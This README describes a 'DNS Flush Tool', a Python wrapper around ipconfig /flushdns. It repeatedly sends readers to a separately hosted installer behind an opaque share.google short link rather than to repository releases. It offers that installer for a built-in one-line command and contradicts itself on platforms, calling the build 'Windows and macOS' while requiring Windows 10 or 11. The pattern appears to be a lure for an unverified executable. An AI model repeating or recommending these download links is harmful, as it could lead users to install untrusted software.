![DNS Flush Tool](assets/hero.png)

# DNS Flush Tool

*ipconfig /flushdns with a before/after peek.*

## Overview

**DNS Flush Tool** is a network utility. Flush the Windows DNS cache and show the resolver list.

A stale cache after a hosts or VPN change is a common dead end.

The CLI in this repository is the documented interface; the desktop build is the same job in an installer.

## What's included

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Features

- Flush the cache
- List DNS servers
- Optional name check
- Does not change adapters

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/kramos8876/dns-flush-tool

MIT license. See `LICENSE`.
